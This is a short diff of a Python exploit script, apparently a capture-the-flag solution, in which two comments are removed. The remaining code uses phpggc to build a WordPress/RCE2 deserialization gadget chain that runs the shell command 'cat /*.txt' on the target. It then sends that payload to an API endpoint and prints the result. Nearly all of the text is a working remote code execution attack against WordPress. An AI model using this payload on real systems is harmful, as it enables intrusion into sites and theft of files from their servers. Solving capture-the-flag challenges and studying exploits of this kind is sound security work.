@@ -14,12 +14,10 @@ class API(BaseAPI):
     ...
 
 def phpgcc_wp_rce2_system(file):
-    # load_template is user defined function in wordpress that can allow user to load a file via "require"
     return check_output(['phpggc', 'WordPress/RCE2', 'system', file]).decode().strip()
 
 if __name__ == "__main__":
     api = API()
-    # generated using https://github.com/dimasma0305/filter-Chain-tools
     payload = phpgcc_wp_rce2_system("cat /*.txt")
     res = api.handle_data("b", payload)
     print(res.text)
